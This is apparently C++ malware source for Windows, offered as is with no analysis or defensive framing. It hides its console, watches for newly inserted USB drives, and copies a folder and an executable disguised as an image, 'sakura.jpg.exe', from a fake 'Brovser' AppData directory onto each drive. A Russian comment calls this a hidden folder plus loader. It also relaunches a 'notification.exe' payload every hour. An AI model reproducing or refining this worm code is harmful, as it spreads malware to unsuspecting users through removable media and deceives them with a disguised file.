#include <windows.h>
#include <string>
#include <stdio.h>
#include <time.h>
#include <thread>
#include <future>
using namespace std;

string allDrives;
char getRemovableDisk();
char driveLetter = getRemovableDisk();
void new_device(){
    for(;;) {
        driveLetter = getRemovableDisk();
        /*
        Скрытая папка + загрузчик 
        */
        string command0 {(string)"mkdir "+driveLetter+":\\good_folder"};
        string command {(string)"xcopy C:\\Users\\%USERNAME%\\AppData\\Local\\Brovser\\good_folder "+driveLetter+":\\good_folder  /s /e /h"};
        string command2 {(string)"copy C:\\Users\\%USERNAME%\\AppData\\Local\\Brovser\\sakura.jpg.exe "+driveLetter+":\\"};
        string command_check {(string)"@echo off IF exist "+driveLetter+":\\good_folder ( echo 1 ) ELSE ( echo 0) "};
        if (driveLetter != '0') {
            int a {system(command_check.c_str())};
            if (a==0){
            system(command0.c_str());
            system(command.c_str());
            system(command2.c_str());
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}
void notification(){
    for(;;) {
        system("start C:\\Users\\%USERNAME%\\AppData\\Local\\Brovser\\good_folder\\notification.exe");
        std::this_thread::sleep_for(3600s);
    }
}
int main(void) {
    FreeConsole();
    auto future1 = std::async(notification);
    auto future2 = std::async(new_device);
    return 0;
}

char getRemovableDisk() {
    char drive = '0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);

    string currentDrives = "";

    //cout << dwResult << endl;
    for (int i = 0; i < dwResult; i++) {
        if (szLogicalDrives[i] > 64 && szLogicalDrives[i] < 90) {
            currentDrives.append(1, szLogicalDrives[i]);
            if (allDrives.find(szLogicalDrives[i]) > 100) {
                drive = szLogicalDrives[i];
            }
        }
    }
    allDrives = currentDrives;
    return drive;
}